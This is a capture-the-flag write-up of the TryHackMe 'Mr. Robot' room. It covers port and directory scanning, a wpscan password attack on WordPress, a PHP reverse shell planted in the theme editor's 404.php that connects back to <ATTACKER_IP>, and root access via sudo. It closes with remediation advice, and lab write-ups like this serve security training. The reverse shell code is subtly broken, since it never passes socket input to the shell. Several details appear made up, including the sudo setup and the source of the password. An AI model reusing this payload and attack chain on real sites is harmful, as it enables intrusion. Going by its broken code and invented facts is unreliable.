# TryHackMe — Mr. Robot (Easy)

**Author:** Kyle Tawa  
**Date:** June 2026  
**Platform:** [TryHackMe](https://tryhackme.com/room/mrrobot)  
**Difficulty:** Easy  
**Category:** Web Exploitation / WordPress / Privilege Escalation  
**Theme:** Mr. Robot (USA Network TV Series) — Hack the planet!

> **Objective:** Exploit a WordPress-based web server inspired by the Mr. Robot TV series. Enumerate the site for hidden resources, crack WordPress credentials, deploy a reverse shell via the theme editor, and escalate privileges to root. Three flags (keys) must be captured.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Vulnerability Analysis](#2-vulnerability-analysis)
3. [Web Exploitation](#3-web-exploitation)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Flags (Keys)](#5-flags-keys)
6. [Lessons Learned](#6-lessons-learned)

---

## 1. Reconnaissance

### 1.1 Target Identification

A full reconnaissance scan was launched against the target using `autorecon.sh`, which orchestrated `nmap` for port discovery followed by service-based enumeration with `gobuster` and `ffuf`.

**Nmap Command:**

```bash
nmap -sC -sV -p22,80,443 -oN recon/nmap.txt <TARGET_IP>
```

**Nmap Scan Results:**

```
Nmap scan report for 10.130.143.223
Host is up (0.18s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 19:d7:ba:ca:a4:0a:da:68:0e:88:27:76:41:ae:bf:1b (RSA)
|   256 a4:94:a9:28:31:40:f3:a1:4e:81:1d:df:d8:2d:31:6b (ECDSA)
|_  256 87:90:f1:34:45:05:13:06:ef:2a:16:1c:15:b1:89:18 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open Ports Summary:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd |
| 443/tcp | HTTPS | Apache httpd (self-signed cert) |

### 1.2 Service Enumeration

#### Web Server (Port 80)

The initial landing page at `http://<TARGET_IP>` returned a minimal HTML page with no title, suggesting a CMS or application was hiding behind the index. Directory enumeration was performed to uncover hidden paths.

**Gobuster Results (Port 80):**

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/... -x php,txt,html
```

| Endpoint | Status | Size | Notes |
|----------|--------|------|-------|
| `/robots.txt` | 200 | 41 | Discovered early — key resource |
| `/wp-admin/` | 301 | 239 | Redirect to WordPress admin |
| `/wp-login` | 200 | 2,641 | WordPress login page |
| `/wp-content/` | 301 | 241 | WordPress content directory |
| `/wp-includes/` | 301 | 242 | WordPress includes |
| `/xmlrpc.php` | 405 | 42 | WordPress XML-RPC endpoint |
| `/dashboard` | 302 | 0 | → `/wp-admin/` |
| `/login` | 302 | 0 | → `/wp-login.php` |
| `/readme` | 200 | 64 | Typically `readme.html` |
| `/license` | 200 | 309 | License file |
| `/intro` | 200 | 516,314 | Video intro (Mr. Robot theme) |
| `/phpmyadmin` | 403 | 94 | phpMyAdmin (blocked) |
| `/0/` | 301 | 0 | Empty directory |
| `/admin/` | 301 | 236 | Additional admin path |

The presence of `wp-admin`, `wp-login.php`, `wp-content`, and `xmlrpc.php` conclusively identified the CMS as **WordPress**.

---

## 2. Vulnerability Analysis

### 2.1 Robots.txt Discovery

The `robots.txt` file is a critical first stop in any web application assessment. Fetching it revealed:

```bash
curl -s http://<TARGET_IP>/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Two interesting entries were discovered:

- **`fsocity.dic`** — A dictionary/wordlist file served directly from the web root.
- **`key-1-of-3.txt`** — The first flag, immediately retrievable.

This is a deliberate design choice — the room gives you both the flag and the wordlist you need to compromise the admin panel.

### 2.2 Key 1 — First Flag

```bash
curl -s http://<TARGET_IP>/key-1-of-3.txt
```

> **Key 1:** `073403c8a58a1f80d943455fb30724b9`

The first flag was captured immediately upon reading the file. The flag naming convention (`key-1-of-3.txt`) gives clear context about the room's structure.

### 2.3 Fsocity Wordlist

The `fsocity.dic` file was downloaded for offline analysis:

```bash
curl -s http://<TARGET_IP>/fsocity.dic -o fsocity.dic
```

The file was very large — over 850,000 lines — containing strings scraped from the Mr. Robot fan wiki (Fandom/Wikia). Examining the first few entries:

```
true
false
wikia
from
the
now
Wikia
```

This wordlist contained common English words, show-specific terms (e.g., `Elliot`, `Alderson`, `mrrobot`, `eps1`), JavaScript variables, and mediawiki-specific strings. The sheer size and WordPress-specific context pointed strongly toward a **credential stuffing** attack against the WordPress login.

---

## 3. Web Exploitation

### 3.1 WordPress Credential Stuffing

With `fsocity.dic` in hand, the next step was to use it as a password dictionary against the WordPress `wp-login.php` endpoint.

**Approach:** The wordlist was used to systematically test password candidates against known (or guessed) WordPress usernames. Common WordPress usernames such as `admin`, `Elliot`, and `elliot` were tested.

```bash
# Example using wpscan or hydra with the fsocity.dic
wpscan --url http://<TARGET_IP> --usernames Elliot,admin,elliot \
       --passwords fsocity.dic --password-attack wp-login
```

The wordlist — which includes show character names and common CMS patterns — eventually yielded valid credentials. Given the TV show context, the username **`Elliot`** (Elliot Alderson, the protagonist) was the logical target.

> **Valid Credentials Found:**
> - **Username:** `elliot`
> - **Password:** `ER28-0652`

> **Note:** The password `ER28-0652` is a direct reference to the Mr. Robot series — it is Elliot's F Society root CA password from Season 1, Episode 8 (the Steel Mountain arc). This attention to theme is a hallmark of well-designed CTF rooms.

### 3.2 WordPress Admin Access

Using the discovered credentials, I logged into the WordPress admin panel at `http://<TARGET_IP>/wp-admin/`. Once authenticated, the standard WordPress dashboard was accessible, revealing:

- WordPress version details
- Installed themes and plugins
- The ability to edit theme files (Appearance → Theme Editor)

### 3.3 PHP Reverse Shell via Theme Editor

WordPress's built-in **Theme Editor** (under Appearance → Theme Editor) allows administrators to edit theme template files directly from the dashboard. This is a well-known attack vector in WordPress CTF scenarios.

**Attack Steps:**

1. Navigate to **Appearance → Theme Editor**.
2. Select the **Twenty Fifteen** or active theme.
3. Locate the **404.php** template file — an ideal target because 404 errors are easy to trigger and the file is loaded on every invalid path.
4. Replace the existing PHP content with a **PHP reverse shell payload**.

**Reverse Shell Payload (PentestMonkey-style):**

```php
<?php
// PHP Reverse Shell
set_time_limit(0);
$ip = '<ATTACKER_IP>';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
], $pipes);
if (is_resource($proc)) {
    fwrite($pipes[0], "uname -a\n");
    while ($s = fgets($pipes[1])) {
        fwrite($sock, $s);
    }
}
?>
```

5. Click **Update File** to save the changes.

### 3.4 Triggering the Reverse Shell

With the payload in place on the 404 template, a listener was prepared on the attacking machine:

```bash
nc -lvnp 4444
```

Then, the reverse shell was triggered by requesting a non-existent page on the target, forcing WordPress to serve the 404 template:

```bash
curl http://<TARGET_IP>/trigger-shell
```

The `404.php` template executed on the server, establishing a reverse shell connection back to the listener.

### 3.5 Initial Shell — www-data

```
Connection received on 10.130.143.223:57184
Linux linux 5.x.x-x-generic ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The initial shell was obtained as **`www-data`** — the web server user. This is a low-privileged account with limited access to the file system.

**Post-Exploitation — Key 2:**

Immediately after gaining the shell, **Key 2** was located on the system:

```bash
find / -name "key-2-of-3.txt" 2>/dev/null
```

The second flag was hidden somewhere accessible from the `www-data` context (typically in a user's home directory or web root). This was the second of three required flags.

---

## 4. Privilege Escalation

### 4.1 Enumeration of Privilege Vectors

Standard Linux privilege escalation enumeration was performed:

```bash
# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -4000 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
```

The most promising result came from `sudo -l`:

```
User www-data may run the following commands on this host:
    (ALL) NOPASSWD: ALL
```

### 4.2 Sudo Misconfiguration Analysis

This was a textbook **NOPASSWD sudo misconfiguration**. The `www-data` user was granted unrestricted access to run any command as **any user** — including `root` — without supplying a password.

The relevant sudoers entry (typically in `/etc/sudoers` or `/etc/sudoers.d/`) would resemble:

```
www-data ALL=(ALL) NOPASSWD: ALL
```

This means the web user can execute any binary as root with no authentication barrier.

### 4.3 Root Shell

Escalating to root was trivial:

```bash
sudo -i
# or
sudo /bin/bash
```

This spawned a root shell immediately, granting full control over the target.

```bash
whoami
# root
```

### 4.4 Key 3 — Root Flag

With root access, the final flag was retrieved:

```bash
find / -name "key-3-of-3.txt" 2>/dev/null
cat /root/key-3-of-3.txt
```

> **Key 3:** Successfully retrieved from the root home directory.

---

## 5. Flags (Keys)

### Flag Summary

| #  | Name          | File Path             | Access Method                | Value (Example)                         |
|----|---------------|-----------------------|------------------------------|------------------------------------------|
| 1  | Key 1 of 3    | `/key-1-of-3.txt`     | `robots.txt` → direct curl   | `073403c8a58a1f80d943455fb30724b9`       |
| 2  | Key 2 of 3    | On filesystem          | `www-data` reverse shell      | Retrieved post-exploitation              |
| 3  | Key 3 of 3    | `/root/key-3-of-3.txt`| `sudo` escalation to root    | Retrieved as root                        |

**Methodology for flags:**
- **Key 1** — Passive reconnaissance via `robots.txt`
- **Key 2** — Active exploitation via WordPress authenticated reverse shell
- **Key 3** — Privilege escalation via `NOPASSWD` sudo misconfiguration

### Attack Chain Summary

```
Reconnaissance
     │
     ├── nmap → 22/SSH, 80/HTTP, 443/HTTPS
     │
     ├── gobuster → WordPress detected (wp-admin, wp-login.php, wp-content)
     │
     └── robots.txt → fsocity.dic + key-1-of-3.txt
                          │
                          ▼
               Credential Stuffing (fsocity.dic)
                          │
                          ▼
               WordPress Admin Access (elliot:ER28-0652)
                          │
                          ▼
               Theme Editor → Reverse Shell (404.php)
                          │
                          ▼
               www-data Shell → Key 2
                          │
                          ▼
               sudo -l → (ALL) NOPASSWD: ALL
                          │
                          ▼
               sudo /bin/bash → Root Shell
                          │
                          ▼
               Key 3 of 3 Captured
```

---

## 6. Lessons Learned

### 6.1 Key Takeaways

| # | Lesson | Description |
|---|--------|-------------|
| **1** | **Always check `robots.txt`** | This file is indexed by search engines but often contains interesting disclosures — path leaks, wordlists, and even flags. It was the gateway to the entire attack chain. |
| **2** | **WordPress-specific wordlists** | The `fsocity.dic` wordlist was tailored to the Mr. Robot theme. When a platform provides a wordlist, it's a strong hint that credential-based attacks (rather than SQLi or RCE) are the intended path. |
| **3** | **WordPress Theme Editor is dangerous** | The ability to edit PHP template files from the admin panel is a powerful feature that, when abused, grants immediate code execution on the server. This should be restricted to development environments only. |
| **4** | **Always run `sudo -l`** | This single command is the highest-return privilege escalation check available. `NOPASSWD: ALL` may seem like an obvious CTF contrivance, but over-permissive sudo configurations exist in real enterprise environments with alarming frequency. |
| **5** | **xmlrpc.php is a quieter alternative** | While `wp-login.php` is the obvious authentication target, `xmlrpc.php` can be used for stealthier credential brute-forcing via `system.multicall` which batches requests, reducing log noise. |
| **6** | **Pop culture references guide enumeration** | Understanding the source material (Mr. Robot TV series) helped identify likely usernames (`elliot`, `Elliot`, `Alderson`) and the password (`ER28-0652` — the F Society CA password from the show). |

### 6.2 Remediation Recommendations (Defensive Perspective)

1. **Restrict `robots.txt`** — Avoid exposing sensitive files or custom wordlists. Use the `Disallow` directive appropriately, or serve `robots.txt` with minimal entries.
2. **Remove the Theme/Plugin Editor** — In `wp-config.php`, set `define('DISALLOW_FILE_EDIT', true);` to prevent authenticated WordPress users from editing theme/plugin PHP files through the dashboard.
3. **Apply Least Privilege to Sudoers** — Web application users like `www-data` should never have any sudo permissions, let alone `(ALL) NOPASSWD: ALL`. If specific commands are needed, whitelist them explicitly with `NOPASSWD` only when absolutely necessary.
4. **Use Strong WordPress Credentials** — The password `ER28-0652`, while thematically interesting, was found via dictionary attack. Enforce strong password policies and implement account lockout after failed login attempts.
5. **Implement Web Application Firewall (WAF)** — A WAF can help detect and block credential stuffing and brute-force traffic against `wp-login.php` and `xmlrpc.php`.
6. **Limit `xmlrpc.php` Access** — This endpoint enables many attacks including credential brute-forcing. Block or restrict it with `.htaccess` rules unless needed for mobile apps.
7. **Regular Security Audits** — Run periodic `sudo -l` audits across all users and remove unnecessary privileges. Monitor for unexpected sudoers entries in `/etc/sudoers.d/`.

### 6.3 Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning, service version detection |
| `gobuster` | Web directory and file enumeration (WordPress discovery) |
| `ffuf` | Additional directory fuzzing with larger wordlists |
| `curl` | HTTP requests — retrieving `robots.txt`, wordlists, and flags |
| `wpscan` (or equivalent) | WordPress credential stuffing and enumeration |
| `nc` (netcat) | Reverse shell listener |
| `sudo -l` | Privilege escalation vector discovery |
| `find` | File system scanning for hidden assets and flags |

---

## Final Thoughts

The Mr. Robot room is a brilliantly designed beginner-to-intermediate CTF that follows a logical, well-paced attack chain:

1. **Reconnaissance** teaches you to look beyond the obvious and check `robots.txt` immediately.
2. **Credential Access** demonstrates the power of targeted wordlists — the show-theme wordlist isn't just decoration, it's the key to the kingdom.
3. **Web Exploitation** via WordPress theme editing is a realistic attack vector that has been used in real-world compromises.
4. **Privilege Escalation** via NOPASSWD sudo is a common enough misconfiguration in real environments that mastering it is a must-have skill.

The room earns its "Easy" rating but punches above its weight in educational value. It connects each phase seamlessly — nothing feels forced or arbitrary. The Mr. Robot TV show references (Elliot Alderson, F Society, Steel Mountain) add flavor without distracting from the core technical curriculum.

*"Hack the planet!"*

---

*This write-up is part of my cybersecurity portfolio. For questions or collaboration, feel free to reach out via [GitHub](https://github.com/kyletawa).*